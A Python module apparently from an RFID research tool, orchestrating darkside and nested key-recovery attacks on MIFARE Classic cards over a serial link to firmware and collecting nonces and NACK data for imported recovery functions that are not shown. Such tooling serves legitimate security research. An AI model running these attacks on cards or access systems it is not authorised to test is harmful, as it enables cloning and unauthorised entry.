"""
Attack orchestrator for MIFARE Classic key recovery.

Coordinates firmware data collection with Python key recovery.
Designed to run from a background thread, communicating results via queue.
"""

import queue
import threading

from key_recovery import darkside_recover, nested_recover


class AttackOrchestrator:
    def __init__(self, serial_handler):
        self.serial = serial_handler
        self.state = "idle"
        self.result_queue = queue.Queue()  # results for GUI
        self._uid = None
        self._last_nt = None
        self._nack_data = []
        self._nested_data = []
        self._known_keys = {}  # sector -> key bytes
        self._target_sector = None

    def start_darkside(self, sector: int):
        """Start darkside attack on a sector."""
        self.state = "darkside"
        self._last_nt = None
        self._nack_data = []
        self._target_sector = sector
        self.serial.send_command(f"K{sector:02X}")

    def start_nested(self, known_block: int, target_block: int, known_key: bytes):
        """Start nested attack using a known key."""
        self.state = "nested"
        self._nested_data = []
        key_hex = known_key.hex().upper()
        cmd = f"N{known_block:02X}{target_block:02X}{key_hex}"
        self.serial.send_command(cmd)

    def stop(self):
        """Stop current attack."""
        if self.state != "idle":
            self.serial.send_command("X")
            self.state = "idle"

    def feed(self, msg: dict):
        """Feed a parsed serial message to the orchestrator."""
        if self.state == "darkside":
            self._handle_darkside(msg)
        elif self.state == "nested":
            self._handle_nested(msg)

    def _handle_darkside(self, msg: dict):
        if msg.get("type") != "DARK":
            return

        subtype = msg.get("subtype")
        if subtype == "UID":
            self._uid = int(msg["uid"], 16)
            self.result_queue.put({"event": "dark_uid", "uid": msg["uid"]})
        elif subtype == "NT":
            self._last_nt = int(msg["nt"], 16)
        elif subtype == "NACK":
            nr_ar = bytes.fromhex(msg["nr_ar"])
            self._nack_data.append({"nt": self._last_nt, "nr_ar": nr_ar})
            self._last_nt = None
            self.result_queue.put({
                "event": "dark_nack",
                "count": len(self._nack_data)
            })
        elif subtype == "TIMEOUT":
            self._last_nt = None
            self.result_queue.put({"event": "dark_timeout"})
        elif subtype == "DONE":
            # Try to recover key
            if self._uid and self._nack_data:
                candidates = darkside_recover(self._uid, self._nack_data)
                self.result_queue.put({
                    "event": "dark_complete",
                    "candidates": [c.hex() for c in candidates],
                    "nack_count": len(self._nack_data),
                })
            self.state = "idle"

    def _handle_nested(self, msg: dict):
        if msg.get("type") != "NESTED":
            return

        subtype = msg.get("subtype")
        if subtype == "NT":
            nt_known = int(msg["nt_known"], 16)
            nt_target = int(msg["nt_target"], 16)
            self._nested_data.append((nt_known, nt_target))
            self.result_queue.put({
                "event": "nested_nonce",
                "count": len(self._nested_data)
            })
        elif subtype == "FAIL":
            self.result_queue.put({
                "event": "nested_fail",
                "reason": msg.get("reason", "unknown")
            })
        elif subtype == "DONE":
            self.state = "idle"
            self.result_queue.put({
                "event": "nested_complete",
                "nonce_pairs": len(self._nested_data),
            })
